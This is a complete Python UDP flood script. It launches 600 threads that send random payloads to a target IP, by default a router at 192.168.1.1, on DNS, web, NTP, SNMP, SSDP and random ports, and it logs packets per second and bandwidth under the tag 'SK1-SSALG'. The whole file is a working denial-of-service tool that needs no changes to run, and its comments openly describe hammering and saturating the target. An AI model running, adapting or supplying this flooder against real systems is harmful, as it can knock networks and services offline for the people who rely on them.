import socket
import threading
import time
import random

TARGET_IP = "192.168.1.1"  # YOUR ROUTER

# THREAD BREAKDOWN
UDP_RAPID_PPS = 150    # Fast small packets
UDP_PPS = 150          # Regular PPS
UDP_RAPID_BW = 150     # Fast large packets  
UDP_BW = 150           # Regular bandwidth
TOTAL_THREADS = 600

# Global counters
total_packets = 0
total_bytes = 0

# ==================== UDP RAPID PPS (FAST SMALL) ====================
def udp_rapid_pps(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # MAXIMUM SPEED - 64 byte packets
            for _ in range(25):  # 25 packets per loop
                payload = random.randbytes(64)
                
                # RAPID FIRE to all critical ports
                for port in [53, 80, 443, 123, 161, 1900]:
                    sock.sendto(payload, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += 64
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== UDP PPS (REGULAR) ====================
def udp_pps(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Regular PPS - 128 byte packets
            for _ in range(15):
                payload = random.randbytes(128)
                
                # Attack range of ports
                for _ in range(8):
                    port = random.randint(1, 65535)
                    sock.sendto(payload, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += 128
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== UDP RAPID BANDWIDTH (FAST LARGE) ====================
def udp_rapid_bw(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Fast bandwidth - 1024 byte packets
            for _ in range(8):
                payload = random.randbytes(1024)
                
                # Hammer bandwidth ports
                for port in [80, 443, 8080, 8443]:
                    sock.sendto(payload, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += 1024
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== UDP BANDWIDTH (REGULAR LARGE) ====================
def udp_bandwidth(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Maximum bandwidth - 1472 byte packets (max UDP)
            for _ in range(5):
                payload = random.randbytes(1472)
                
                # Saturate all ports
                for _ in range(6):
                    port = random.randint(1, 65535)
                    sock.sendto(payload, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += 1472
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== LAUNCH ALL 600 THREADS ====================
# Start UDP Rapid PPS
for i in range(UDP_RAPID_PPS):
    t = threading.Thread(target=udp_rapid_pps, args=(i,))
    t.daemon = True
    t.start()

# Start UDP PPS
for i in range(UDP_PPS):
    t = threading.Thread(target=udp_pps, args=(i,))
    t.daemon = True
    t.start()

# Start UDP Rapid Bandwidth
for i in range(UDP_RAPID_BW):
    t = threading.Thread(target=udp_rapid_bw, args=(i,))
    t.daemon = True
    t.start()

# Start UDP Bandwidth
for i in range(UDP_BW):
    t = threading.Thread(target=udp_bandwidth, args=(i,))
    t.daemon = True
    t.start()

# ==================== LOGGING ONLY ====================
last_log = time.time()

while True:
    time.sleep(1)
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    # Calculate
    pps = int(total_packets / elapsed) if elapsed > 0 else 0
    mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
    
    # Reset
    total_packets = 0
    total_bytes = 0
    
    # SK1-SSALG LOGGING ONLY
    print(f"SK1-SSALG | {pps:,}/s | {mbps:.1f}Mbps")
